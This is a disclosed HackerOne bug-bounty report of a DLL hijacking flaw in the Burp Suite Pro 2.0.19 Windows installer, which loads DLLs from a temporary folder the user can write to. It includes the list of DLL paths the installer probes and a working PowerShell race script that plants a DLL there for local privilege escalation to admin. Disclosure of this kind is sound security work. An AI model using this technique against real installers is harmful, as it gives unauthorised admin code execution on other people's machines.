# DLL Hijacking in Burp Suite Pro 2.0.19 Installer

## Report Details
- **Report ID**: 518837
- **URL**: https://hackerone.com/reports/518837
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-03-29T18:35:16.531Z
- **Disclosed**: 2019-04-01T09:37:11.444Z

## Reporter
- **Username**: freetom
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: portswigger

## Vulnerability Information
I've found that the latest installer of Burp Suite Pro tries to load some DLLs from an unprotected folder. After providing it with admin privileges (required to install) it tries to load these DLLs:

```
C:\Users\bortto\AppData\Local\Temp\e4jA5E5.tmp_dir1553882416\jre\bin\WINMM.dll
C:\Users\bortto\AppData\Local\Temp\e4jA5E5.tmp_dir1553882416\jre\bin\WSOCK32.dll
C:\Users\bortto\AppData\Local\Temp\e4jA5E5.tmp_dir1553882416\jre\bin\VERSION.dll
C:\Users\bortto\AppData\Local\Temp\e4jA5E5.tmp_dir1553882416\jre\bin\WINMMBASE.dll
C:\Users\bortto\AppData\Local\Temp\e4jA5E5.tmp_dir1553882416\jre\bin\DBGHELP.DLL
C:\Users\bortto\AppData\Local\Temp\e4jA5E5.tmp_dir1553882416\jre\bin\dbgcore.DLL
C:\Users\bortto\AppData\Local\Temp\e4jA5E5.tmp_dir1553882416\jre\lib\libjava.base-coop.dll
C:\Users\bortto\AppData\Local\Temp\e4jA5E5.tmp_dir1553882416\jre\lib\libjava.logging-coop.dll
C:\Users\bortto\AppData\Local\Temp\e4jA5E5.tmp_dir1553882416\jre\lib\libjdk.compiler-coop.dll
C:\Users\bortto\AppData\Local\Temp\e4jA5E5.tmp_dir1553882416\jre\lib\libjdk.scripting.nashorn-coop.dll
C:\Users\bortto\AppData\Local\Temp\e4jA5E5.tmp_dir1553882416\jre\lib\libjdk.internal.vm.ci-coop.dll
C:\Users\bortto\AppData\Local\Temp\e4jA5E5.tmp_dir1553882416\jre\lib\libjdk.internal.vm.compiler-coop.dll
C:\Users\bortto\AppData\Local\Temp\e4jA5E5.tmp_dir1553882416\jre\bin\WINHTTP.dll
C:\Users\bortto\AppData\Local\Temp\e4jA5E5.tmp_dir1553882416\jre\bin\urlmon.dll
C:\Users\bortto\AppData\Local\Temp\e4jA5E5.tmp_dir1553882416\jre\bin\iertutil.dll
C:\Users\bortto\AppData\Local\Temp\e4jA5E5.tmp_dir1553882416\jre\bin\CRYPTBASE.DLL
```

`e4jA5E5.tmp_dir1553882416` is a temporary folder that is created just in time by the installer but its ACL doesn't protect it from modifications by the current user. The folder is dynamically created, though there is a time window in which a local attacker (that has a program running as the current user but looks for escalating privileges for persistence, etc.) can find the folder and inject a DLL and get code execution as admin.

I created the following script to exploit the issue:

```
$output = ""
while(!$output){
        Start-Sleep -milliseconds 10
        $output = Get-process | where {$_.ProcessName -like 'burpsuite_pro_windows-x64*'}
}
Start-Sleep -milliseconds 1000
$f = (Get-ChildItem -Filter "*tmp_dir*" C:\Users\bortto\AppData\Local\Temp\ | ?{ $_.PSIsContainer } | Sort CreationTime -Descending | Select -First 1).Name.trim()

Write-Host "$f"

Copy-Item -Path "C:\users\bortto\Downloads\Project1.dll" -Destination "C:\Users\bortto\AppData\Local\Temp\$f\jre\bin\DBGHELP.dll"
```

I attach `Project1.dll` (is just a DLL that upon loading pops a message box with the current user). I compiled it myself.

I also attach a video that shows the PoC running successfully (note: the few seconds of black screen are due to Windows UAC popup). I tested the video and is viewable with Windows Media Player.

## Impact

Local Privilege Escalation

## Attachments
- Project1.dll
- privesc_burp.mp4
